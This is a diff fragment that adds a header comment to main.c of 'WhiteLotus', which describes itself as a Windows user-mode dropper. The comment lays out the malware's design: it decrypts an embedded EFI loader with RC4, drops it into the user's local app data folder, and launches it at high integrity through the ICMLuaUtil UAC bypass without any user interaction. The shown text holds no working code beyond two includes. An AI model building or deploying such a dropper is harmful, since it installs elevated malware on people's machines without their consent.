@@ -1,3 +1,28 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — Windows User-Mode Dropper
+ *  File     : main.c
+ * ============================================================
+ *
+ *  Description:
+ *    Entry point of the dropper executable. Detects CPU
+ *    architecture (x64-only), RC4-decrypts the embedded EFI
+ *    loader payload (LoaderPayload) in-memory, writes it to
+ *    %LOCALAPPDATA%\loadefi.exe, resolves the required ntdll
+ *    functions, then launches the dropped file at HIGH
+ *    integrity level via the ICMLuaUtil UAC bypass.
+ *
+ *  Purpose:
+ *    - First-stage delivery: decrypt, drop, and elevate the
+ *      EFI installer without requiring user interaction.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "main.h"
 #include <objbase.h>
 
